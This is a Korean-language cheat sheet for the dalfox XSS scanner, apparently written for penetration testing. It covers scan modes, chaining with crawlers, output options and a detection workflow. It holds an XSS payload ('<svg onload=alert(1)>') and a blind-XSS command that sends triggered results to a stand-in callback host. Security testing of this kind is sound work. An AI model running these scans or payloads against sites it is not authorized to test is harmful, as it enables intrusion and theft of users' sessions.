# dalfox XSS 스캐너

- dalfox — URL 파라미터 분석부터 XSS 페이로드 검증까지 자동화하는 Go 기반 XSS 스캐너. url/file/pipe 세 가지 입력 모드와 blind XSS 콜백을 지원한다.
- 파라미터에 반사되는 XSS를 대량으로 점검할 때, 크롤러가 수집한 URL 전체에 XSS 스캔을 돌릴 때, blind XSS 콜백을 걸어두고 트리거 지점을 찾을 때.
- 단일 바이너리. Kali는 apt install dalfox 또는 GitHub release, Windows는 dalfox.exe(이 호스트처럼 WDAC Application Control 정책이 있는 환경에서는 실행이 차단될 수 있다).

## 기본 명령어 구조

```bash
dalfox url "http://HOST:PORT/page?q=test" [옵션]
dalfox file urls.txt
dalfox pipe
```

## URL 스캔

```bash
dalfox url "http://10.10.10.10/search?q=test&page=1"
# 특정 파라미터만 테스트
dalfox url "http://10.10.10.10/search?q=test" -p q
```

- url 모드는 URL의 모든 파라미터를 자동 분석해 반사 여부, DOM, 취약 payload를 검사한다.
- 콘솔에 [V] 태그가 붙은 판정과 검증된 payload가 출력된다.

## pipe 입력 — 크롤러 연계

```bash
katana -u http://10.10.10.10 -d 3 | dalfox pipe
gau 10.10.10.10 | dalfox pipe --skip-bav
```

- pipe 모드는 stdin으로 받은 URL 목록 전체를 스캔한다. katana, gau, waybackurls 등 크롤러 출력을 그대로 넘기는 흐름이 실전 기본형이다.
- --skip-bav는 내장 공격 벡터(BAV) 점검을 건너뛰어 속도를 높인다.

## blind XSS 콜백

```bash
dalfox url "http://10.10.10.10/feedback?msg=test" -b "https://your-callback.example.com"
```

- `-b`로 콜백 URL을 지정하면 blind용 payload가 삽입되고, 누군가 렌더링하면 콜백 서버(xsshunter, OAST 등)로 결과가 전달된다.
- blind XSS는 응답에서 즉시 판정이 안 되므로 콜백 서버를 미리 준비해 둔다.

## payload 모드와 커스텀

```bash
# 취약 파라미터에 커스텀 payload 주입 검증
dalfox url "http://10.10.10.10/search?q=test" --custom-payload '<svg onload=alert(1)>'

# 외부 payload 집합 활용 (portswigger, payloadbox)
dalfox url "http://10.10.10.10/search?q=test" --remote-payloads portswigger
```

## 주요 옵션

- `-p`: 테스트할 파라미터 지정(콤마 다중).
- `-b`: blind XSS 콜백 URL.
- `-w`: 동시 워커 수. 대상 부하와 스캔 속도 조절.
- `--custom-payload`: 커스텀 payload 주입.
- `--remote-payloads portswigger|payloadbox`: 외부 payload 목록 사용.
- `--skip-bav, --skip-dom, --skip-grepping`: 내장 벡터·DOM·grep 점검 생략.
- `-o`: 결과 파일 저장. --format plain|json|jsonl과 조합.

```bash
dalfox url "http://10.10.10.10/search?q=test" -o result.txt
dalfox url "http://10.10.10.10/search?q=test" -o result.json --format json
```

## 실전 XSS 탐지 흐름

```text
1. katana / gau / waybackurls로 파라미터가 있는 URL 수집
2. dalfox pipe로 1차 스캔 (blind 콜백 -b 함께 지정)
3. [V] 판정 파라미터를 브라우저에서 수동 재확인
4. blind 콜백 서버에서 늦게 트리거된 지점을 추적 (관리자 뷰어 등)
```

## 팁·트러블슈팅

- Windows WDAC(Application Control) 정책이 있는 호스트에서는 dalfox.exe가 차단될 수 있다. 파일 자체는 정상이므로 Kali 등 일반 환경에서 실행한다.
- [V] 판정은 서버 응답 기반이라 오탐이 있다. 실제 실행 여부는 브라우저에서 재확인한다.
- 스캔이 대상에 과부하를 주면 -w로 워커 수를 줄이고 --silence로 출력을 정리한다.
- 파라미터가 없는 정적 URL은 url 모드에서 반사 지점을 못 찾는다. 크롤러로 파라미터 있는 URL을 먼저 모은다.
